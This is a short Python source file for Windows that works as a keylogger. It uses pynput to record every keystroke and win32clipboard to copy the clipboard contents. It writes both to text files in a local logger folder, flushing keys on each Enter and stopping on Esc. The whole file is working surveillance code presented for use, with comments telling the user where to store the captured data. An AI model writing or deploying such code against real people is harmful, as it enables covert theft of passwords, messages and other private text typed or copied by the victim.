import win32clipboard
from pynput.keyboard import Key, Listener

# Function to copy clipboard data and save it to a file
def copy_clipboard(file_path, extend, clipboard_information):
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            entered_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + entered_data + "\n\n")

        except:
            f.write("Clipboard could not be copied\n\n")

# Function to write captured keystrokes to a file
def write_keys(keys, file_path, extend, keys_information):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)
        f.write("\n")
        f.flush()

# Provide the appropriate values for these variables
# Directory path where you want to store the captured data
directory_path = r"C:\Users\Dell\OneDrive\Desktop\logger\\"

# Subdirectory name (if needed)
extend = ""  # You can add a subdirectory here if needed

# Filename to store clipboard data
clipboard_information = "clipboard.txt"

# Filename to store captured keystrokes
keys_information = "keys_information.txt"

# List to store captured keystrokes
keys = []

# Keyboard listener functions
def on_press(key):
    global keys
    try:
        keys.append(key)
    except AttributeError:
        pass

def on_release(key):
    if key == Key.esc:
        return False

    if key == Key.enter:
        write_keys(keys, directory_path, extend, keys_information)
        keys.clear()

# Set up the keyboard listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Start listening for keyboard events
    listener.join()

# After the listener exits, capture clipboard data
copy_clipboard(directory_path, extend, clipboard_information)
